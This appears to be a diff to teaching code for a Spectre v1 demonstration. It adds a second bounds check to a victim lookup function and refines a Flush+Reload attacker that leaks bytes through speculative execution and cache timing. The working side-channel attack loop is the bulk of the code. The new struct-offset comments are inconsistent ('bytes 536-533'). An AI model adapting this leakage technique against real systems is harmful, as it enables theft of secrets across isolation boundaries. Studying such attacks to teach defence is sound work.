@@ -53,8 +53,9 @@ uint64_t calibrate_latency() {
 
 // Branchless select based on the predicate (covered in class)
 inline size_t csel(size_t T, size_t F, bool pred) {
-    size_t mask = -(size_t)(!!pred);
+    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
     return (T & mask) | (F & ~mask);
+    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
 }
 
 // Flush "N" lines from address "start" with a stride of "stride"
@@ -64,8 +65,8 @@ void flush_lines(void *start, size_t stride, size_t N) {
     }
 }
 
-// Find the most hit cacheline and decode its character
-void decode_cache_state(char *c, uint64_t *hits, size_t cnt) {
+// Find the most hit cacheline and safely decode its character
+void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
     uint64_t most_hits = 0, scd_most_hits = 0;
     unsigned char raw_c = '\0', scd_raw_c = '\0';
     for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
@@ -80,8 +81,8 @@ void decode_cache_state(char *c, uint64_t *hits, size_t cnt) {
 
     *c = isprint(raw_c) ? raw_c : '?';
     char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
-    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); 2nd best guess: '%c' "
-           "(ASCII=%#4x, #hits=%3lu)\n",
+    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
+           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
            *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
 }
 // ====== End of helper functions ======
@@ -95,27 +96,49 @@ typedef struct {
 
 typedef struct {
     uint8_t item_id;
-} Order; // 1B
+} Order; // 1B, so convenient for the attacker
 
 typedef struct {
     Item *items;  /* bytes 0-7 */
     Order *orders; /* bytes 8-15 */
-    char memo[512]; /* bytes 16-527  */
+    char memo[512]; /* bytes 16-527 */
     size_t num_orders; /* bytes 528-535 */
+    size_t num_items; /* bytes 536-533 */
     char manager[256]; /* bytes 536-791 */
 } SalesRecords;
+/* Why do we need the memo and manager fields? This is because we need to
+flush "num_orders" and "num_items" from the cache, yet we require the pointers
+to items and orders to remain cached. "memo" provides enough padding
+such that "num_orders" and "num_items" do no co-locate with the two pointers
+on the same cache line. We also need the padding from the "manager" field
+because otherwise "num_orders" and "num_items" may share a cache line with
+other memory allocations---e.g., the item array---depending on the memory
+allocator details. (This actually happened when I was playing with it.)
+When this happens, reading "num_orders" also brings the first few bytes
+of the first item into the cache, polluting the Flush+Reload results.
+If this confuses you, see the illustration below:
 
-#define NUM_ITEMS 256
+Memory layout if SalesRecords does NOT have the "manager field"
+|------------------------------ Cache line -------------------------------|
+|End of memo][num_orders][num_items ]|[First item from the item array.....|
+0            16           24         |32                                 63
+             End of the SalesRecords-|
+
+Reading "num_orders" and "num_items" also brings the beginning part of
+the first item into the cache. */
+
+#define MAX_NUM_ITEMS 256 // A convenient number of items for the attacker!
 #define NUM_ORDERS 4
+#define NUM_ITEMS 4
 
 SalesRecords *init_sales_records() {
     SalesRecords *recs = calloc(1, sizeof(SalesRecords));
-    Item *items = calloc(NUM_ITEMS , sizeof(Item));
+    Item *items = calloc(MAX_NUM_ITEMS , sizeof(Item));
     Order *orders = calloc(NUM_ORDERS, sizeof(Order));
     assert(recs && items && orders); // A lazy sanity check, don't do this in practice
 
     // Fill the memory region with placeholder zeros, forcing page allocation
-    memset(items, 0, sizeof(Item) * NUM_ITEMS);
+    memset(items, 0, sizeof(Item) * MAX_NUM_ITEMS);
     memset(orders, 0, sizeof(Order) * NUM_ORDERS);
 
     items[0] = (Item){.item_type=1, .item_name="Lemon", .item_desc="Make some lemonade"};
@@ -135,22 +158,26 @@ SalesRecords *init_sales_records() {
                            .memo = "The best science is done with a little bit "
                                    "of crazy and a whole lot of duct tape",
                            .num_orders = NUM_ORDERS,
+                           .num_items = NUM_ITEMS,
                            .manager = "Cave Johnson"};
     return recs;
 }
 
 void free_sales_records(SalesRecords *records) {
-    free(records->items);
-    free(records->orders);
-    free(records);
+    if (records) {
+        free(records->items);
+        free(records->orders);
+        free(records);
+    }
 }
 
-// An unsuspecting function containing a Spectre gadget
+// An unsuspecting business logic containing a Spectre gadget!
 uint8_t lookup_item_id(SalesRecords *recs, size_t order_id) {
     if (order_id < recs->num_orders) {
         uint8_t item_id = recs->orders[order_id].item_id; // Access load
-        // We assume item_ids are correctly set and we don't need to validate it
-        return recs->items[item_id].item_type; // Transmit load
+        if (item_id < recs->num_items) {
+            return recs->items[item_id].item_type; // Transmit load
+        }
     }
     return 0; // Invalid item
 }
@@ -163,7 +190,7 @@ uint8_t lookup_item_id(SalesRecords *recs, size_t order_id) {
 void attacker(SalesRecords *records) {
     uint64_t threshold = calibrate_latency();
     printf("-----------------------------------------\n");
-    uint64_t hits[NUM_ITEMS] = { 0 };
+    uint64_t hits[MAX_NUM_ITEMS] = { 0 };
     char buf[BUF_SIZE] = { '\0' };
 
     uint8_t *array_base = &records->orders[0].item_id;
@@ -184,38 +211,35 @@ void attacker(SalesRecords *records) {
 
                 // The "Flush" part of Flush+Reload
                 // Can be replaced with Prime+Probe
-                flush_lines(records->items, sizeof(Item), NUM_ITEMS);
-                // Flush num_orders to delay the branch resolution
+                flush_lines(records->items, sizeof(Item), MAX_NUM_ITEMS);
+
+                // Flush num_orders and num_items to delay branch resolution
                 // Can be replaced with eviction using an eviction set
                 _mm_clflush(&records->num_orders);
+                _mm_clflush(&records->num_items);
 
+                // Ensure clflushes are finished
                 _mm_mfence();
-                _mm_lfence(); // Ensure clflushes are finished
+                _mm_lfence();
 
                 // Call the victim function and prevent compiler optimizations
                 _no_opt(lookup_item_id(records, index));
             }
 
-            for (size_t i = 0; i < SYMBOL_CNT; i++) {
-                // A clever hack that traverses 0..255 in an unpredictable way
-                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
+            for (size_t i = 0; i < MAX_NUM_ITEMS; i++) {
+                // A clever hack to traverse [0, 255] in an unpredictable order
+                // to confuse the prefetcher
+                size_t idx = (i * 167 + 13) % MAX_NUM_ITEMS;
 
                 // The "Reload" part of Flush+Reload
                 // Can be replaced with Prime+Probe
                 uint8_t *ptr = &records->items[idx].item_type;
-
-                uint64_t start = _timer_start();
-                _maccess(ptr);
-                uint64_t lat = _timer_end() - start;
-
-                if (lat <= threshold) {
-                    hits[idx] += 1;
-                }
+                hits[idx] += (_time_maccess(ptr) <= threshold);
             }
         }
 
         // Save the recovered character
-        decode_cache_state(&buf[c], hits, SYMBOL_CNT);
+        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
         memset(hits, 0, sizeof(hits)); // Reset hit counts
     }
 
@@ -264,7 +288,6 @@ void naive_attacker() {
 
                 flush_lines(pages, stride, SYMBOL_CNT);
                 _mm_clflush((void *)&array_size);
-
                 _mm_mfence();
                 _mm_lfence();
                 _no_opt(naive_victim(pages, index, stride));
@@ -273,19 +296,12 @@ void naive_attacker() {
             for (size_t i = 0; i < SYMBOL_CNT; i++) {
                 size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                 uint8_t *ptr = pages + stride * idx;
-
-                uint64_t start = _timer_start();
-                _maccess(ptr);
-                uint64_t lat = _timer_end() - start;
-
-                if (lat <= threshold) {
-                    hits[idx] += 1;
-                }
+                hits[idx] += _time_maccess(ptr) < threshold;
             }
         }
 
         // Save the recovered character
-        decode_cache_state(&buf[c], hits, SYMBOL_CNT);
+        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
         memset(hits, 0, sizeof(hits));
     }
 
